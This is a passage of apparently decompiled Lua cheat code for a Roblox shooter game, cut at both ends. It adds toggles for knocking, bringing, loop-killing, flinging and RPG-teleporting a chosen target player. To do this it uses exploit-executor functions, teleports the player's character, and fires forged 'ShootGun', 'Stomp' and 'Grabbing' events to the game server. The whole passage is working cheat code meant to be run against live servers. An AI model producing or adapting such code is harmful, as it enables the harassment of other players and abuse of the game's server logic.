                "ShootGun", character52:FindFirstChildOfClass("Tool").Handle, game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position, _G.targetPlayer.Character.HumanoidRootPart.Position, _G.targetPlayer.Character.Head, Vector3.new(0, 0, -1)
              )
            end
          else
            game.Players.LocalPlayer.Backpack:FindFirstChild("[Rifle]").Parent = game.Players.LocalPlayer.Character
          end

          val204 = false
          return
        end

        function GetRifleAmmoPrice()
          local shop6 = game.Workspace.Ignored.Shop

          for key60, value72 in pairs(shop6:GetChildren()) do
            local model6 = value72:IsA("Model")
            local find = model6

            if model6 then

              find = value72.Name:find("5 %[Rifle Ammo%]")
            end

            if find then
              return value72
            end
          end

          return nil
        end

        function CheckAndBuyRifleAmmo()

          local rifle2 = game.Players.LocalPlayer.DataFolder.Inventory:FindFirstChild("[Rifle]")
          local numVal3 = rifle2 and (tonumber(rifle2.Value)) <= 0

          if numVal3 then
            local val393 = GetRifleAmmoPrice()

            if val393 then
              knockplr = false
              bringplr = false
              loopkillplr = false
              arrestplr = false
              noclip = false

              if (game.Players.LocalPlayer.Character:FindFirstChild("[Rifle]")) then
                game.Players.LocalPlayer.Character:FindFirstChild("[Rifle]").Parent = game.Players.LocalPlayer.Backpack
              end

              for n = 1, 6 do
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = val393.Head.CFrame

                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(
                  0, 0, 0
                )

                local clickDetector7 = val393:FindFirstChildWhichIsA("ClickDetector")

                if clickDetector7 then
                  fireclickdetector(clickDetector7)
                end

                task.wait(0.8)
              end

              task.wait(0.8)
              local val394 = knockplr
              local val395 = val394

              if val394 then
                local val396 = bringplr
                local val397 = val396

                if val396 then

                  val397 = loopkillplr and arrestplr
                end

                val395 = val397
              end

              if val395 then
                knockplr = true
                bringplr = true
                loopkillplr = true
                arrestplr = true
                noclip = true
              end
            end
          end

          return
        end

        val205 = false

        function GetLMGPrice()
          local shop7 = game.Workspace.Ignored.Shop

          for key61, value73 in pairs(shop7:GetChildren()) do
            local model7 = value73:IsA("Model")
            local lmg = model7

            if model7 then

              lmg = value73.Name:find("%[LMG%]")
            end

            if lmg then
              return value73
            end
          end

          return nil
        end

        function LMGAttack()
          val204 = true
          task.spawn(AutoReload)
          local val398 = GetLMGPrice()
          local val399 = val398

          if val398 then
            local val400 = not val205
            local localPlayer14 = val400

            if val400 then

              localPlayer14 = not (game.Players.LocalPlayer.Backpack:FindFirstChild("[LMG]"))
            end

            val399 = localPlayer14
          end

          local backpack10

          if val399 then

            game.Players.LocalPlayer.Backpack:FindFirstChild("[LMG]")

            repeat
              game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = val398.Head.CFrame
                * (CFrame.new(0, -5, 0))

              game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(
                0, 0, 0
              )

              local clickDetector8 = val398:FindFirstChildWhichIsA("ClickDetector")

              if clickDetector8 then
                fireclickdetector(clickDetector8)
              end

              task.wait(0.01)
              backpack10 = game.Players.LocalPlayer.Backpack
            until (backpack10:FindFirstChild("[LMG]"))

            val205 = true
          end

          CheckAndBuyLMGAmmo()

          if (game.Players.LocalPlayer.Character:FindFirstChild("[LMG]")) then
            local targetPlayer2 = _G.targetPlayer
            local val401 = targetPlayer2

            if targetPlayer2 then
              local character54 = _G.targetPlayer.Character
              local val402 = character54

              if character54 then
                local bodyEffects4 = _G.targetPlayer.Character.BodyEffects
                local val403 = bodyEffects4

                if bodyEffects4 then

                  local kO4 = _G.targetPlayer.Character.BodyEffects:FindFirstChild("K.O")
                  local val404 = kO4

                  if kO4 then

                    val404 = not _G.targetPlayer.Character.BodyEffects:FindFirstChild("K.O").Value
                  end

                  val403 = val404
                end

                val402 = val403
              end

              val401 = val402
            end

            if val401 then

              local mainEvent8 = game:GetService("ReplicatedStorage").MainEvent

              local character55 = game:GetService("Players").LocalPlayer.Character

              mainEvent8:FireServer(
                "ShootGun", character55:FindFirstChildOfClass("Tool").Handle, game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position, _G.targetPlayer.Character.HumanoidRootPart.Position, _G.targetPlayer.Character.Head, Vector3.new(0, 0, -1)
              )
            end
          else
            game.Players.LocalPlayer.Backpack:FindFirstChild("[LMG]").Parent = game.Players.LocalPlayer.Character
          end

          val204 = false
          return
        end

        function GetLMGAmmoPrice()
          local shop8 = game.Workspace.Ignored.Shop

          for key62, value74 in pairs(shop8:GetChildren()) do
            local model8 = value74:IsA("Model")
            local find2 = model8

            if model8 then

              find2 = value74.Name:find("200 %[LMG Ammo%]")
            end

            if find2 then
              return value74
            end
          end

          return nil
        end

        function CheckAndBuyLMGAmmo()

          local lmg2 = game.Players.LocalPlayer.DataFolder.Inventory:FindFirstChild("[LMG]")
          local numVal4 = lmg2 and (tonumber(lmg2.Value)) <= 0

          if numVal4 then
            local val405 = GetLMGAmmoPrice()

            if val405 then
              knockplr = false
              bringplr = false
              loopkillplr = false
              arrestplr = false
              noclip = false

              if (game.Players.LocalPlayer.Character:FindFirstChild("[LMG]")) then
                game.Players.LocalPlayer.Character:FindFirstChild("[LMG]").Parent = game.Players.LocalPlayer.Backpack
              end

              for i6 = 1, 6 do
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = val405.Head.CFrame

                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(
                  0, 0, 0
                )

                local clickDetector9 = val405:FindFirstChildWhichIsA("ClickDetector")

                if clickDetector9 then
                  fireclickdetector(clickDetector9)
                end

                task.wait(0.8)
              end

              task.wait(0.8)
              local val406 = knockplr
              local val407 = val406

              if val406 then
                local val408 = bringplr
                local val409 = val408

                if val408 then

                  val409 = loopkillplr and arrestplr
                end

                val407 = val409
              end

              if val407 then
                knockplr = true
                bringplr = true
                loopkillplr = true
                arrestplr = true
                noclip = true
              end
            end
          end

          return
        end

        val206 = false

        function GetAUGPrice()
          local shop9 = game.Workspace.Ignored.Shop

          for key63, value75 in pairs(shop9:GetChildren()) do
            local model9 = value75:IsA("Model")
            local aug = model9

            if model9 then

              aug = value75.Name:find("%[AUG%]")
            end

            if aug then
              return value75
            end
          end

          return nil
        end

        function AUGAttack()
          val204 = true
          task.spawn(AutoReload)
          local val410 = GetAUGPrice()
          local val411 = val410

          if val410 then
            local val412 = not val206
            local localPlayer15 = val412

            if val412 then

              localPlayer15 = not (game.Players.LocalPlayer.Character:FindFirstChild("[LMG]"))
            end

            val411 = localPlayer15
          end

          local backpack12

          if val411 then

            game.Players.LocalPlayer.Backpack:FindFirstChild("[AUG]")

            repeat
              game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = val410.Head.CFrame
                * (CFrame.new(0, -5, 0))

              game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(
                0, 0, 0
              )

              local clickDetector10 = val410:FindFirstChildWhichIsA("ClickDetector")

              if clickDetector10 then
                fireclickdetector(clickDetector10)
              end

              task.wait(0.01)
              backpack12 = game.Players.LocalPlayer.Backpack
            until (backpack12:FindFirstChild("[AUG]"))

            val206 = true
          end

          CheckAndBuyAUGAmmo()

          if (game.Players.LocalPlayer.Character:FindFirstChild("[AUG]")) then
            local targetPlayer3 = _G.targetPlayer
            local val413 = targetPlayer3

            if targetPlayer3 then
              local character57 = _G.targetPlayer.Character
              local val414 = character57

              if character57 then
                local bodyEffects5 = _G.targetPlayer.Character.BodyEffects
                local val415 = bodyEffects5

                if bodyEffects5 then

                  local kO5 = _G.targetPlayer.Character.BodyEffects:FindFirstChild("K.O")
                  local val416 = kO5

                  if kO5 then

                    val416 = not _G.targetPlayer.Character.BodyEffects:FindFirstChild("K.O").Value
                  end

                  val415 = val416
                end

                val414 = val415
              end

              val413 = val414
            end

            if val413 then

              local mainEvent9 = game:GetService("ReplicatedStorage").MainEvent

              local character58 = game:GetService("Players").LocalPlayer.Character

              mainEvent9:FireServer(
                "ShootGun", character58:FindFirstChildOfClass("Tool").Handle, game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position, _G.targetPlayer.Character.HumanoidRootPart.Position, _G.targetPlayer.Character.Head, Vector3.new(0, 0, -1)
              )
            end
          else
            game.Players.LocalPlayer.Backpack:FindFirstChild("[AUG]").Parent = game.Players.LocalPlayer.Character
          end

          val204 = false
          return
        end

        function GetAUGAmmoPrice()
          local shop10 = game.Workspace.Ignored.Shop

          for key64, value76 in pairs(shop10:GetChildren()) do
            local model10 = value76:IsA("Model")
            local find3 = model10

            if model10 then

              find3 = value76.Name:find("90 %[AUG Ammo%]")
            end

            if find3 then
              return value76
            end
          end

          return nil
        end

        function CheckAndBuyAUGAmmo()

          local aug2 = game.Players.LocalPlayer.DataFolder.Inventory:FindFirstChild("[AUG]")
          local numVal5 = aug2 and (tonumber(aug2.Value)) <= 0

          if numVal5 then
            local val417 = GetAUGAmmoPrice()

            if val417 then
              knockplr = false
              bringplr = false
              loopkillplr = false
              arrestplr = false
              noclip = false

              if (game.Players.LocalPlayer.Character:FindFirstChild("[AUG]")) then
                game.Players.LocalPlayer.Character:FindFirstChild("[AUG]").Parent = game.Players.LocalPlayer.Backpack
              end

              for i7 = 1, 6 do
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = val417.Head.CFrame

                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(
                  0, 0, 0
                )

                local clickDetector11 = val417:FindFirstChildWhichIsA("ClickDetector")

                if clickDetector11 then
                  fireclickdetector(clickDetector11)
                end

                task.wait(0.8)
              end

              task.wait(0.8)
              local val418 = knockplr
              local val419 = val418

              if val418 then
                local val420 = bringplr
                local val421 = val420

                if val420 then

                  val421 = loopkillplr and arrestplr
                end

                val419 = val421
              end

              if val419 then
                knockplr = true
                bringplr = true
                loopkillplr = true
                arrestplr = true
                noclip = true
              end
            end
          end

          return
        end

        function FistAttack()

          if (game.Players.LocalPlayer.Character:FindFirstChild("Combat")) then

            game.Players.LocalPlayer.Character:FindFirstChild("Combat"):Activate()
          else
            game.Players.LocalPlayer.Backpack:FindFirstChild("Combat").Parent = game.Players.LocalPlayer.Character
          end

          return
        end

        game.Players.LocalPlayer.CharacterAdded:Connect(function()
          val201 = false
          val202 = false
          val203 = false
          val205 = false
          val206 = false
          return
        end)

        val86 = ui

        ui:AddDropdown(target, "Meele Attack Method", { "Combat", "Knife", "Bat", "Pitchfork" }, "Combat", UDim2.new(0, 145, 0, 0), function(attackMethod)
          _G.attackMethod = attackMethod
          return
        end)

        val87 = ui

        ui:AddDropdown(target, "Gun Attack Method", { "Rifle", "LMG", "AUG" }, "Select", UDim2.new(0, 145, 0, 0), function(attackMethod2)
          _G.attackMethod = attackMethod2
          return
        end)

        function helper19()
          if _G.attackMethod == "Combat" then
            FistAttack()
          else
            if _G.attackMethod == "Knife" then
              KnifeAttack()
            else
              if _G.attackMethod == "Pitchfork" then
                PitchAttack()
              else
                if _G.attackMethod == "Bat" then
                  BatAttack()
                else
                  if _G.attackMethod == "Rifle" then
                    RifleAttack()
                  else
                    if _G.attackMethod == "LMG" then
                      LMGAttack()
                    else
                      if _G.attackMethod == "AUG" then
                        AUGAttack()
                      else
                        FistAttack()
                      end
                    end
                  end
                end
              end
            end
          end

          return
        end

        val88 = ui

        ui:AddButton(target, "Goto", function()
          helper14(CFrame.new(_G.targetPlayer.Character.HumanoidRootPart.Position))
          return
        end)

        connect5 = nil
        connect6 = nil
        val89 = ui

        ui:AddToggle(target, "View", false, function(p66)

          if connect5 then

            connect5:Disconnect()
            connect5 = nil
          end

          if connect6 then

            connect6:Disconnect()
            connect6 = nil
          end

          local function helper21()
            local targetPlayer4 = p66 and _G.targetPlayer

            if targetPlayer4 then
              workspace.CurrentCamera.CameraSubject = _G.targetPlayer.Character.Humanoid
            else

              if getgenv().csync == true and ClonedCharacter then
                workspace.CurrentCamera.CameraSubject = ClonedCharacter.Humanoid
              else
                if getgenv().csync == false then
                  workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                end
              end
            end

            return
          end

          helper21()

          if p66 then

            connect5 = game.Players.LocalPlayer.CharacterAdded:Connect(function(character62)
              character62:WaitForChild("FULLY_LOADED_CHAR")
              task.wait(0.2)
              helper21()
              return
            end)

            if _G.targetPlayer then

              connect6 = _G.targetPlayer.CharacterAdded:Connect(function(character63)
                character63:WaitForChild("FULLY_LOADED_CHAR")
                helper21()
                return
              end)
            end
          end

          return
        end)

        function helper9(val422)
          return val422:FindFirstChildOfClass("Humanoid")
        end

        function helper10(val423)
          local humanoidRootPart23 = val423:FindFirstChild("HumanoidRootPart")
          local upperTorso = humanoidRootPart23

          if not humanoidRootPart23 then
            local torso = val423:FindFirstChild("Torso")

            upperTorso = torso or val423:FindFirstChild("UpperTorso")
          end

          return upperTorso
        end

        val207 = false
        val208 = helper10

        function helper11(val424)
          local localPlayer16 = helper10(game.Players.LocalPlayer.Character)

          if localPlayer16 and val424 then
            localPlayer16.CFrame = CFrame.new(
              localPlayer16.Position, localPlayer16.Position + (val424.Position - localPlayer16.Position).Unit
            )
          end

          return
        end

        val209 = helper9
        val210 = helper11
        val90 = ui

        ui:AddToggle(target, "knock", false, function(p70)
local val425

          if p70 then
            local targetPlayer5 = _G.targetPlayer

            if not targetPlayer5 then
              print("No target selected.")
              return
            else
              getgenv().csync = true
              wait(0.1)

              knocksavepos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
              val207 = true

              if not (targetPlayer5.Character.BodyEffects:FindFirstChild("K.O").Value == true) then
              end

              repeat
                task.wait()
                local localPlayer17 = helper10(game.Players.LocalPlayer.Character)
                local val426 = helper10(targetPlayer5.Character)
                local val427 = helper9(targetPlayer5.Character)
                local val428 = not localPlayer17
                local val429 = val428

                if not val428 then

                  val429 = not val426 or not val427
                end

                if val429 then
                  print("Missing essential parts of character or target.")
                  break
                else

                  local findFirstChild5 = game.Workspace.Vehicles:FindFirstChild(targetPlayer5.Name)

                  if findFirstChild5 then
                    localPlayer17.CFrame = (CFrame.new(findFirstChild5.Position))
                      * (CFrame.new(findFirstChild5.Velocity * 0.4)) * (CFrame.new(0, 0, 0))
                  end

                  local val430 = not (targetPlayer5.Character.BodyEffects:FindFirstChild("K.O"))
                  local val431 = val430

                  if not val430 then

                    val431 = not targetPlayer5.Character.BodyEffects:FindFirstChild("K.O").Value
                  end

                  if val431 then
                    game.Players.LocalPlayer.Character.Humanoid.Sit = false
                    helper19()
                    local val432 = _G.attackMethod == "Rifle"
                    local val433 = val432

                    if not val432 then

                      val433 = _G.attackMethod == "LMG" or _G.attackMethod == "AUG"
                    end

                    if val433 then
                      localPlayer17.CFrame = CFrame.new(val426.Position + (Vector3.new(0, 3, 0))
                        + val427.MoveDirection * 0.6 * val427.WalkSpeed)
                    else

                      local tool11 = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
                      local localPlayer18 = tool11

                      if tool11 then

                        localPlayer18 = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Name
                          == "Combat"
                      end

                      if localPlayer18 then

                        if (game.Players.LocalPlayer.Character:FindFirstChild("BodyEffects"):FindFirstChild("Movement"):FindFirstChild("ReduceWalk")) then
                          localPlayer17.CFrame = CFrame.new(val426.Position + (Vector3.new(0, -5, 0))
                            + val427.MoveDirection * 0.4 * val427.WalkSpeed)
                        else
                          localPlayer17.CFrame = CFrame.new(
                            math.random(-500, 500), 500, math.random(-500, 500)
                          )
                        end
                      else
                        localPlayer17.CFrame = CFrame.new(val426.Position + (Vector3.new(0, -5, 0))
                          + val427.MoveDirection * 0.4 * val427.WalkSpeed)
                      end
                    end
                  end

                  helper11(val426)

                  val425 = targetPlayer5.Character.BodyEffects:FindFirstChild("K.O").Value
                      == true
                    or val207 == false
                end
              until val425

              repeat

                if not (targetPlayer5.Character:FindFirstChild("K.O")) then
                  val207 = false
                  getgenv().scync = false
                end
              until val207 == false

              val207 = false
              game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(knocksavepos)
              getgenv().csync = false
              ::L5864542::
              return
            end
          else
            getgenv().csync = false
            val207 = false
            goto L5864542
          end
        end)

        position = nil
        val211 = false
        val91 = ui

        ui:AddToggle(target, "Bring", false, function(p71)
local val434

          if p71 then
            local targetPlayer6 = _G.targetPlayer

            if not targetPlayer6 then
              print("No target selected.")
              return
            else
              getgenv().csync = true
              wait(0.1)

              position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
              val211 = true

              if not (targetPlayer6.Character.BodyEffects:FindFirstChild("K.O").Value == true) then
              end

              repeat
                task.wait()
                local localPlayer19 = helper10(game.Players.LocalPlayer.Character)
                local val435 = helper10(targetPlayer6.Character)
                local val436 = helper9(targetPlayer6.Character)
                local val437 = not localPlayer19
                local val438 = val437

                if not val437 then

                  val438 = not val435 or not val436
                end

                if val438 then
                  print("Missing essential parts of character or target.")
                  break
                else

                  local findFirstChild6 = game.Workspace.Vehicles:FindFirstChild(targetPlayer6.Name)

                  if findFirstChild6 then
                    localPlayer19.CFrame = (CFrame.new(findFirstChild6.Position))
                      * (CFrame.new(findFirstChild6.Velocity * 0.4))
                  end

                  local val439 = not (targetPlayer6.Character.BodyEffects:FindFirstChild("K.O"))
                  local val440 = val439

                  if not val439 then

                    val440 = not targetPlayer6.Character.BodyEffects:FindFirstChild("K.O").Value
                  end

                  if val440 then
                    game.Players.LocalPlayer.Character.Humanoid.Sit = false
                    helper19()
                    local val441 = _G.attackMethod == "Rifle"
                    local val442 = val441

                    if not val441 then

                      val442 = _G.attackMethod == "LMG" or _G.attackMethod == "AUG"
                    end

                    if val442 then
                      localPlayer19.CFrame = CFrame.new(val435.Position + (Vector3.new(0, 3, 0))
                        + val436.MoveDirection * 0.6 * val436.WalkSpeed)
                    else

                      local tool12 = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
                      local localPlayer20 = tool12

                      if tool12 then

                        localPlayer20 = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Name
                          == "Combat"
                      end

                      if localPlayer20 then

                        if (game.Players.LocalPlayer.Character:FindFirstChild("BodyEffects"):FindFirstChild("Movement"):FindFirstChild("ReduceWalk")) then
                          localPlayer19.CFrame = CFrame.new(val435.Position + (Vector3.new(0, -5, 0))
                            + val436.MoveDirection * 0.4 * val436.WalkSpeed)
                        else
                          localPlayer19.CFrame = CFrame.new(
                            math.random(-500, 500), 500, math.random(-500, 500)
                          )
                        end
                      else
                        localPlayer19.CFrame = CFrame.new(val435.Position + (Vector3.new(0, -5, 0))
                          + val436.MoveDirection * 0.4 * val436.WalkSpeed)
                      end
                    end
                  end

                  helper11(val435)

                  if targetPlayer6.Character.BodyEffects.Dead.Value == true then
                    val211 = false
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(position)
                    getgenv().csync = false
                  end

                  val434 = targetPlayer6.Character.BodyEffects:FindFirstChild("K.O").Value
                      == true
                    or val211 == false
                end
              until val434

              if not (targetPlayer6.Character:FindFirstChild("GRABBING_CONSTRAINT")) then
              end

              repeat

                local getValueString2 = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()

                local numVal6 = tonumber(string.split(getValueString2, "(")[1])
                local val443 = math.clamp(numVal6 / 1000, 0.05, 0.2)

                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = (CFrame.new(targetPlayer6.Character.UpperTorso.Position))
                  * (CFrame.new(0, 3, 0))

                if not (targetPlayer6.Character:FindFirstChild("K.O")) then

                  game:GetService("ReplicatedStorage").MainEvent:FireServer("Grabbing", false)
                end

                task.wait(val443)

                grabbingCONSTRAINT = (targetPlayer6.Character:FindFirstChild("GRABBING_CONSTRAINT"))
                  or val211 == false
              until grabbingCONSTRAINT

              val211 = false
              game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(position)
              getgenv().csync = false
              ::L13658775::
              return
            end
          else
            getgenv().csync = false
            val211 = false
            goto L13658775
          end
        end)

        position2 = nil

        function waitLoop()
local val444, val445

          if not val213 then
            return
          else
            local targetPlayer7 = _G.targetPlayer

            if not targetPlayer7 then
              return
            else
              getgenv().csync = true
              task.wait(0.1)

              game.Players.LocalPlayer.Character:WaitForChild("FULLY_LOADED_CHAR")

              if not (game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool")) then
                position2 = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
              end

              val212 = true

              if not (targetPlayer7.Character.BodyEffects:FindFirstChild("K.O").Value == true) then
              end

              repeat
                task.wait()

                if not val213 then
                  break
                else
                  local localPlayer21 = helper10(game.Players.LocalPlayer.Character)
                  local val446 = helper10(targetPlayer7.Character)
                  local val447 = helper9(targetPlayer7.Character)
                  local val448 = not localPlayer21
                  local val449 = val448

                  if not val448 then

                    val449 = not val446 or not val447
                  end

                  if val449 then
                    break
                  else

                    local findFirstChild7 = game.Workspace.Vehicles:FindFirstChild(targetPlayer7.Name)

                    if findFirstChild7 then
                      localPlayer21.CFrame = (CFrame.new(findFirstChild7.Position))
                        * (CFrame.new(findFirstChild7.Velocity * 0.4)) * (CFrame.new(0, 0, 0))
                    end

                    local val450 = not (targetPlayer7.Character.BodyEffects:FindFirstChild("K.O"))
                    local val451 = val450

                    if not val450 then

                      val451 = not targetPlayer7.Character.BodyEffects:FindFirstChild("K.O").Value
                    end

                    if val451 then
                      game.Players.LocalPlayer.Character.Humanoid.Sit = false
                      helper19()
                      local val452 = _G.attackMethod == "Rifle"
                      local val453 = val452

                      if not val452 then

                        val453 = _G.attackMethod == "LMG" or _G.attackMethod == "AUG"
                      end

                      if val453 then
                        localPlayer21.CFrame = CFrame.new(val446.Position + (Vector3.new(0, 3, 0))
                          + val447.MoveDirection * 0.6 * val447.WalkSpeed)
                      else

                        local tool13 = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
                        local localPlayer22 = tool13

                        if tool13 then

                          localPlayer22 = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Name
                            == "Combat"
                        end

                        if localPlayer22 then

                          if (game.Players.LocalPlayer.Character:FindFirstChild("BodyEffects"):FindFirstChild("Movement"):FindFirstChild("ReduceWalk")) then
                            localPlayer21.CFrame = CFrame.new(val446.Position + (Vector3.new(0, -5, 0))
                              + val447.MoveDirection * 0.4 * val447.WalkSpeed)
                          else
                            localPlayer21.CFrame = CFrame.new(
                              math.random(-500, 500), 500, math.random(-500, 500)
                            )
                          end
                        else
                          localPlayer21.CFrame = CFrame.new(val446.Position + (Vector3.new(0, -5, 0))
                            + val447.MoveDirection * 0.4 * val447.WalkSpeed)
                        end
                      end
                    end

                    helper11(val446)

                    val444 = targetPlayer7.Character.BodyEffects:FindFirstChild("K.O").Value
                        == true
                      or not val212
                  end
                end
              until val444

              repeat
                task.wait()

                if not val213 then
                  break
                else
                  helper10(game.Players.LocalPlayer.Character).CFrame = (CFrame.new(targetPlayer7.Character.UpperTorso.Position))
                    * (CFrame.new(0, 3, 0))

                  if not (targetPlayer7.Character:FindFirstChild("K.O")) then

                    game.ReplicatedStorage.MainEvent:FireServer("Stomp")
                  end

                  val445 = targetPlayer7.Character.BodyEffects.Dead.Value == true or not val213
                end
              until val445

              if targetPlayer7.Character.BodyEffects.Dead.Value == true then
                val204 = true
                task.spawn(AutoReload)

                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(
                  9000000000, 9000000000, 9000000000
                )
              else
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(position2)
                val204 = false
              end

              val212 = false
              getgenv().csync = false
              return
            end
          end
        end

        val212 = false
        val213 = false

        function waitLoop2(val454)

          local val455 = not val454 or not val454.CharacterAdded

          if val455 then
            return
          else

            val454.CharacterAdded:Connect(function()
              wait(0.7)

              if val213 then
                val214()
              end

              return
            end)

            return
          end
        end

        val214 = waitLoop
        val215 = waitLoop2

        if _G.targetPlayer then
          waitLoop2(_G.targetPlayer)
        end

        game.Players.LocalPlayer.CharacterAdded:Connect(function()

          game.Players.LocalPlayer.Character:WaitForChild("FULLY_LOADED_CHAR")

          if val213 then
            val214()
          end

          return
        end)

        val92 = ui

        ui:AddToggle(target, "loop kill", false, function(p73)
          val213 = p73

          if p73 then
            val214()

            if _G.targetPlayer then
              waitLoop2(_G.targetPlayer)
            end
          else
            val212 = false

            if position2 then
              game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(position2)
              val204 = false
              getgenv().csync = false
            end
          end

          return
        end)

        getValueString = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
        numVal = tonumber(string.split(getValueString, "(")[1])
        val93 = nil

        if numVal < 130 then
          val93 = 0.151
        else
          if numVal < 125 then
            val93 = 0.149
          else
            if numVal < 110 then
              val93 = 0.146
            else
              if numVal < 105 then
                val93 = 0.138
              else
                if numVal < 90 then
                  val93 = 0.136
                else
                  if numVal < 80 then
                    val93 = 0.134
                  else
                    if numVal < 70 then
                      val93 = 0.131
                    else
                      if numVal < 60 then
                        val93 = 0.1229
                      else
                        if numVal < 50 then
                          val93 = 0.1225
                        else
                          if numVal < 40 then
                            val93 = 0.1256
                          end
                        end
                      end
                    end
                  end
                end
              end
            end
          end
        end

        val216 = {}
        val216.grenadeprediction = val93 or 0.145

        val94 = ui

        ui:AddToggle(target, "RPG tp", false, function(p74)
          if p74 then
            val216.rpglock = _G.targetPlayer
          else
            val216.rpglock = nil
          end

          return
        end)

        workspace.Ignored.ChildAdded:Connect(function(child)

          local model11 = (child:IsA("Model")) and child.Name == "Model"

          if model11 then
            local character65 = game.Players.LocalPlayer.Character
            local rpg = character65

            if character65 then

              rpg = game.Players.LocalPlayer.Character:FindFirstChild("[RPG]")
            end

            if rpg then
              wait(0.25)
              local rpglock = val216.rpglock
              local val456 = rpglock

              if rpglock then
                local launcher = child:FindFirstChild("Launcher")
                local launcher = launcher

                if launcher then
                  launcher = isnetworkowner(child:FindFirstChild("Launcher"))
                end

                val456 = launcher
              end

              if val456 then
                character64 = val216.rpglock.Character

                if character64 then

                  local connect11 = game:GetService("RunService").Stepped:Connect(function()

                    if child and child.Launcher then
                      child.Launcher.Position = Vector3.new(
                        character64.Head.Position.X, character64.Head.Position.Y + 5, character64.Head.Position.Z
                      )

                      child.Launcher.BodyVelocity.Velocity = Vector3.new(0, -65, 0)
                    end

                    return
                  end)

                  wait(0.5)
                  connect11:Disconnect()
                end
              end
            end
          end

          return
        end)

        function Fling()
          local character66 = game.Players.LocalPlayer.Character

          for key65, value77 in pairs(character66:GetDescendants()) do
            if (value77:IsA("BasePart")) then
              value77.CustomPhysicalProperties = PhysicalProperties.new(1, 1, 1, 1, 1)
            end
          end

          HiddenPart = Instance.new("Part", workspace)
          HiddenPart.Size = Vector3.new(0.05, 0.05, 0.05)
          HiddenPart.Transparency = 1
          HiddenPart.CanCollide = false
          HiddenPart.Anchored = false

          local instance13 = Instance.new("Weld", HiddenPart)
          instance13.Part0 = HiddenPart
          instance13.Part1 = game.Players.LocalPlayer.Character.Head
          instance13.C0 = CFrame.new()

          local instance14 = Instance.new("BodyGyro", HiddenPart)
          local instance15 = Instance.new("BodyVelocity", HiddenPart)

          instance14.P = 90000
          instance14.maxTorque = Vector3.new(9000000000, 9000000000, 9000000000)
          instance14.CFrame = game.Players.LocalPlayer.Character.Head.CFrame

          instance15.Velocity = Vector3.new(0, 0, 0)
          instance15.maxForce = Vector3.new(9000000000, 9000000000, 9000000000)

          local instance16 = Instance.new("BodyThrust", HiddenPart)
          instance16.Force = Vector3.new(900000, 900000, 900000)
          instance16.Location = HiddenPart.Position

          return
        end

        function StopFling()
          local character67 = game.Players.LocalPlayer.Character

          for key66, value78 in pairs(character67:GetDescendants()) do
            local bodyVelocity3 = value78:IsA("BodyVelocity")
            local val457 = bodyVelocity3

            if not bodyVelocity3 then
              local bodyGyro3 = value78:IsA("BodyGyro")
              local val458 = bodyGyro3

              if not bodyGyro3 then
                local rocketPropulsion = value78:IsA("RocketPropulsion")
                local val459 = rocketPropulsion

                if not rocketPropulsion then
                  local bodyThrust = value78:IsA("BodyThrust")
                  local val460 = bodyThrust

                  if not bodyThrust then
                    local bodyAngularVelocity = value78:IsA("BodyAngularVelocity")
                    local val461 = bodyAngularVelocity

                    if not bodyAngularVelocity then
                      local angularVelocity = value78:IsA("AngularVelocity")
                      local val462 = angularVelocity

                      if not angularVelocity then
                        local bodyForce = value78:IsA("BodyForce")
                        local lineForce = bodyForce

                        if not bodyForce then
                          local vectorForce = value78:IsA("VectorForce")

                          lineForce = vectorForce or value78:IsA("LineForce")
                        end

                        val462 = lineForce
                      end

                      val461 = val462
                    end

                    val460 = val461
                  end

                  val459 = val460
                end

                val458 = val459
              end

              val457 = val458
            end

            if val457 then
              value78:Destroy()
            end
          end

          for key67, value79 in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
            if (value79:IsA("BasePart")) then
              value79.Velocity = Vector3.new(0, 0, 0)
              value79.RotVelocity = Vector3.new(0, 0, 0)
            end
          end

          if HiddenPart then

            HiddenPart:Destroy()
            HiddenPart = nil
          end

          return
        end

        val95 = ui

        ui:AddToggle(target, "Fling", false, function(p75)

          if p75 then
            getgenv().csync = true
            wait(0.1)

            saveposfling = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position
            wait(0.1)
            Fling()

            connect4 = game:GetService("RunService").Stepped:Connect(function()

              for key68, value80 in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                if (value80:IsA("BasePart")) then
                  value80.CanCollide = false
                end
              end

              return
            end)

            Flinging = game:GetService("RunService").Heartbeat:Connect(function()
              task.wait(0.01)

              if (game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")) then
